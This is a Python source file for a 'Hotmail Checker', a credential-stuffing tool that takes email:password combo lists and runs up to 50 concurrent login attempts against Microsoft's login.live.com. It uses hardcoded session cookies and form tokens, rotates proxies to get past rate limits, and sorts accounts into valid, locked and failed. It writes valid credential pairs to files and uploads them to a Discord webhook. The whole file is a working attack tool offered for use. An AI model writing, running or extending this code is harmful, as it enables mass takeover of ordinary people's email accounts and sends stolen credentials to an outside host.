import random
import threading
import requests
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from tempfile import NamedTemporaryFile
from colorama import init, Fore, Style
from datetime import datetime
import tkinter as tk
from tkinter import filedialog

import modules.rpc_manager as rpc_manager
from modules.settings import APP_AUTHOR, DEFAULT_WEBHOOK_URL
rpc_manager.set_details("Hotmail Checker")

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from results_organizer import ResultsOrganizer

init(autoreset=True)

class MailHub:
    def __init__(self):
        self.headersMICROSOFT = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        }
        self.failMICROSOFT = ["Your account or password is incorrect.", "That Microsoft account doesn\\'t exist. Enter a different account", "Sign in to your Microsoft account", 'Please sign in with a Microsoft account or create a new account']
        self.retryMICROSOFT = [",AC:null,urlFedConvertRename", "Too Many Requests"]
        self.nfaMICROSOFT = ["account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "Help us protect your account"]
        self.customMICROSOFT = ["/cancel?mkt=", "/Abuse?mkt="]
        self.hitsMICROSOFT = ['sSigninName', 'PPAuth', 'WLSSC', 'name="ANON"']

    def found(self, keywords, resp):
        for keyword in keywords:
            if keyword in resp:
                return True
        return False

    def payloadMICROSOFT(self, email, password):
        payload = {
            "i13": "0",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "3",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
            "ps": "2",
            "psRNGCDefaultType": "1",
            "psRNGCEntropy": "",
            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
            "PPSX": "Passp",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i19": "21648"
        }
        return payload

    def loginMICROSOFT(self, email, password, proxy):
        session = requests.sessions.session()

        if proxy == None:
            try:
                r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=100)

                if self.found(self.hitsMICROSOFT, r.text):
                    return ["ok", r.cookies.get("X-OWA-CANARY")]

                if self.found(self.nfaMICROSOFT, r.text):
                    return ["nfa"]
            
                if self.found(self.customMICROSOFT, r.text):
                    return ["custom"]
                
                if self.found(self.failMICROSOFT, r.text):
                    return ["fail"]

                if self.found(self.retryMICROSOFT, r.text):
                    return ["retry"]
                
                return ["ok", r.cookies.get("X-OWA-CANARY")]

            except:
                return ["retry"]
        else:
            try:
                r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=200, proxies=proxy)

                if self.found(self.hitsMICROSOFT, r.text):
                    return ["ok", r.cookies.get("X-OWA-CANARY")]

                if self.found(self.nfaMICROSOFT, r.text):
                    return ["nfa"]
            
                if self.found(self.customMICROSOFT, r.text):
                    return ["custom"]
                
                if self.found(self.failMICROSOFT, r.text):
                    return ["fail"]

                if self.found(self.retryMICROSOFT, r.text):
                    return ["retry"]
                
                return ["ok", r.cookies.get("X-OWA-CANARY")]

            except:
                return ["retry"]


class HotmailChecker:
    def __init__(self, main_app):
        self.main_app = main_app
        self.version = "1.1"
        self.author = APP_AUTHOR
        self.mail = MailHub()
        self.write_lock = threading.Lock()
        self.valid_count = 0
        self.invalid_count = 0
        self.total_count = 0
        self.checked_count = 0
        self.results_organizer = ResultsOrganizer()
        self.session_start_time = None
        

    def validate_line(self, line):
        parts = line.strip().split(":")
        if len(parts) == 2:
            return parts[0], parts[1]
        else:
            return None, None

    def attempt_login(self, email, password, proxy, hits_file, local_hits_file):
        try:
            res = self.mail.loginMICROSOFT(email, password, proxy)[0]
            if res == "ok":
                print(f"{Fore.GREEN}[+] Valid   | {email}:{password}{Style.RESET_ALL}")
                with self.write_lock:
                    hits_file.write(f"{email}:{password}\n")
                    hits_file.flush()
                    local_hits_file.write(f"{email}:{password}\n")
                    local_hits_file.flush()
                    
                    hit_data = f"{email}:{password}"
                    self.results_organizer.save_hit("Hotmail Checker", hit_data, self.session_start_time)
                    
                    self.valid_count += 1
            else:
                print(f"{Fore.RED}[-] Invalid | {email}:{password}{Style.RESET_ALL}")
                self.invalid_count += 1
                
            self.checked_count += 1
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error   | {email}:{password} - {str(e)}{Style.RESET_ALL}")
            self.invalid_count += 1
            self.checked_count += 1

    def process_combo_file(self, hits_file, local_hits_file, proxies, combo_path):
        try:
            with open(combo_path, "r", encoding="utf-8", errors="ignore") as file:
                lines = file.readlines()
                self.total_count = len(lines)
                
                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = []
                    for line in lines:
                        email, password = self.validate_line(line)
                        if email is None or password is None:
                            print(f"{Fore.YELLOW}[!] Invalid format: {line.strip()}{Style.RESET_ALL}")
                            continue
                        proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
                        futures.append(executor.submit(self.attempt_login, email, password, proxy, hits_file, local_hits_file))
                    
                    for future in futures:
                        future.result()
        except Exception as e:
            print(f"{Fore.RED}[x] Error processing combo file: {e}{Style.RESET_ALL}")

    def send_to_discord(self, file_path, webhook_url):
        if os.stat(file_path).st_size == 0:
            print(f"{Fore.RED}[x] The file is empty. No valid hits found.{Style.RESET_ALL}")
            return
        try:
            with open(file_path, 'rb') as file:
                files = {
                    'file': ('valid_hits.txt', file, 'text/plain')
                }
                payload = {
                    'content': 'VALID HOTMAILS CHECKED WITH REDX CHECKER.\n'
                }
                response = requests.post(webhook_url, data=payload, files=files)
                if response.status_code == 204:
                    print(f"{Fore.GREEN}[+] Successfully sent file to Discord!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[x] Failed to send file. Status code: {response.status_code}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[x] Error sending file: {e}{Style.RESET_ALL}")

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        self.clear_screen()
        
        banner = f"""{Fore.BLUE}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                     │
│             ██╗  ██╗ ██████╗ ████████╗███╗   ███╗ █████╗ ██╗██╗                     │
│             ██║  ██║██╔═══██╗╚══██╔══╝████╗ ████║██╔══██╗██║██║                     │
│             ███████║██║   ██║   ██║   ██╔████╔██║███████║██║██║                     │
│             ██╔══██║██║   ██║   ██║   ██║╚██╔╝██║██╔══██║██║██║                     │
│             ██║  ██║╚██████╔╝   ██║   ██║ ╚═╝ ██║██║  ██║██║███████╗                │
│             ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝                │
│                                                                                     │
│                       ──── HOTMAIL ACCOUNT CHECKER ────                             │
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}"""
        print(banner)

    def run(self):
        while True:
            self.print_banner()
            
            print(f"""{Fore.BLUE}
┌─────────────────────────────────────────────────────────────────────────────────────┐
│                              CONFIGURATION                                          │
├─────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                     │
│  {Fore.WHITE}[{Fore.LIGHTCYAN_EX}1{Fore.WHITE}]{Fore.CYAN} Select Combo File                 {Fore.WHITE}Choose email:password combo file             {Fore.BLUE}│
│  {Fore.WHITE}[{Fore.LIGHTCYAN_EX}2{Fore.WHITE}]{Fore.CYAN} Select Proxy File (Optional)      {Fore.WHITE}Choose proxy file                            {Fore.BLUE}│
│  {Fore.WHITE}[{Fore.LIGHTCYAN_EX}3{Fore.WHITE}]{Fore.CYAN} Discord Webhook (Optional)        {Fore.WHITE}Enter webhook URL for results                {Fore.BLUE}│
│  {Fore.WHITE}[{Fore.LIGHTCYAN_EX}4{Fore.WHITE}]{Fore.CYAN} Start Checking                    {Fore.WHITE}Begin checking process                       {Fore.BLUE}│
│                                                                                     │
│  {Fore.WHITE}[{Fore.RED}0{Fore.WHITE}]{Fore.RED} Back                                                                           {Fore.BLUE}│
│                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
            
            combo_path = None
            proxy_path = None
            webhook_url = None
            
            choice = input(f"{Fore.CYAN}┌─[{Fore.WHITE}SELECT{Fore.CYAN}]\n└──> {Fore.WHITE}").strip()
            
            if choice == '1':
                root = tk.Tk()
                root.withdraw()
                root.attributes('-topmost', True)
                
                print(f"\n{Fore.CYAN}[*] Opening file dialog...{Style.RESET_ALL}")
                combo_path = filedialog.askopenfilename(
                    title="Select Combo File",
                    filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
                    initialfile="combo.txt"
                )
                
                root.destroy()
                
                if combo_path:
                    print(f"{Fore.GREEN}[+] Combo file selected: {combo_path}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[x] No combo file selected!{Style.RESET_ALL}")
                
                time.sleep(1)
                
            elif choice == '2':
                root = tk.Tk()
                root.withdraw()
                root.attributes('-topmost', True)
                
                print(f"\n{Fore.CYAN}[*] Opening file dialog...{Style.RESET_ALL}")
                proxy_path = filedialog.askopenfilename(
                    title="Select Proxy File (Optional)",
                    filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
                    initialfile="proxies.txt"
                )
                
                root.destroy()
                
                if proxy_path:
                    print(f"{Fore.GREEN}[+] Proxy file selected: {proxy_path}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] No proxy file selected - will check without proxies{Style.RESET_ALL}")
                
                time.sleep(1)
                
            elif choice == '3':
                webhook_url = input(f"\n{Fore.CYAN}Enter Discord webhook URL: {Fore.WHITE}").strip()
                if not webhook_url:
                    webhook_url = DEFAULT_WEBHOOK_URL
                if webhook_url:
                    print(f"{Fore.GREEN}[+] Webhook URL saved{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] No webhook URL entered{Style.RESET_ALL}")
                time.sleep(1)
                
            elif choice == '4':
                if not combo_path:
                    print(f"\n{Fore.RED}[x] Please select a combo file first!{Style.RESET_ALL}")
                    time.sleep(2)
                    continue
                
                self.clear_screen()
                self.print_banner()
                
                print(f"\n{Fore.CYAN}{'═'*85}")
                print(f"{Fore.CYAN}[*] Starting Hotmail Checker...")
                print(f"{Fore.CYAN}{'═'*85}{Style.RESET_ALL}\n")
                
                self.session_start_time = datetime.now()
                self.valid_count = 0
                self.invalid_count = 0
                self.checked_count = 0
                
                proxies = []
                if proxy_path:
                    if os.path.exists(proxy_path):
                        with open(proxy_path, "r", encoding="utf-8", errors="ignore") as proxy_file:
                            proxies = proxy_file.readlines()
                        print(f"{Fore.GREEN}[+] Loaded {len(proxies)} proxies{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[x] Proxy file not found!{Style.RESET_ALL}")
                
                print(f"{Fore.CYAN}[*] Combo file: {combo_path}{Style.RESET_ALL}")
                if webhook_url:
                    print(f"{Fore.CYAN}[*] Discord webhook: {webhook_url[:50]}...{Style.RESET_ALL}")
                print()
                
                try:
                    with open("valid_hits.txt", "a", encoding="utf-8") as local_hits_file:
                        with NamedTemporaryFile(delete=False, mode='w', newline='', encoding='utf-8') as temp_file:
                            print(f"{Fore.CYAN}[*] Starting login attempts...{Style.RESET_ALL}")
                            print(f"{Fore.BLUE}{'─'*85}{Style.RESET_ALL}\n")
                            
                            self.process_combo_file(temp_file, local_hits_file, proxies, combo_path)
                            
                            print(f"\n{Fore.BLUE}{'─'*85}{Style.RESET_ALL}")
                            print(f"{Fore.GREEN}[+] Checking completed!{Style.RESET_ALL}\n")
                            
                            print(f"{Fore.CYAN}┌─────────────────────────────────────────────────────────────────────────────────────┐")
                            print(f"{Fore.CYAN}│                                STATISTICS                                           │")
                            print(f"{Fore.CYAN}├─────────────────────────────────────────────────────────────────────────────────────┤")
                            print(f"{Fore.CYAN}│                                                                                     │")
                            print(f"{Fore.CYAN}│  {Fore.WHITE}Total Processed:{Fore.CYAN}{self.total_count:>68} {Fore.CYAN}│")
                            print(f"{Fore.CYAN}│  {Fore.GREEN}Valid Accounts:{Fore.CYAN}{self.valid_count:>69} {Fore.CYAN}│")
                            print(f"{Fore.CYAN}│  {Fore.RED}Invalid Accounts:{Fore.CYAN}{self.invalid_count:>67} {Fore.CYAN}│")
                            success_rate = (self.valid_count/self.total_count*100) if self.total_count > 0 else 0
                            print(f"{Fore.CYAN}│  {Fore.YELLOW}Success Rate:{Fore.CYAN}{success_rate:>62.2f}% {Fore.CYAN}│")
                            print(f"{Fore.CYAN}│                                                                                     │")
                            print(f"{Fore.CYAN}└─────────────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}\n")
                            
                            stats = {
                                'total_checked': self.total_count,
                                'valid_accounts': self.valid_count,
                                'invalid_accounts': self.invalid_count,
                                'success_rate': success_rate,
                                'proxy_enabled': len(proxies) > 0,
                                'working_proxies': len(proxies) if proxies else 0,
                                'webhook_enabled': webhook_url is not None
                            }
                            self.results_organizer.save_stats("Hotmail Checker", stats, self.session_start_time)

                            if webhook_url:
                                print(f"{Fore.CYAN}[*] Sending results to Discord...{Style.RESET_ALL}")
                                self.send_to_discord(temp_file.name, webhook_url)
                            
                            print(f"{Fore.GREEN}[+] Results saved to: valid_hits.txt{Style.RESET_ALL}")
                            print(f"{Fore.CYAN}[+] Session saved to: results/Hotmail Checker/{self.session_start_time.strftime('%Y-%m-%d_%H-%M-%S')}/{Style.RESET_ALL}\n")
                            
                except Exception as e:
                    print(f"\n{Fore.RED}[x] An unexpected error occurred: {e}{Style.RESET_ALL}")
                
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                
            elif choice == '0':
                break
            else:
                print(f"\n{Fore.RED}[x] Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)


def main():
    checker = HotmailChecker(None)
    checker.run()


if __name__ == "__main__":
    main()
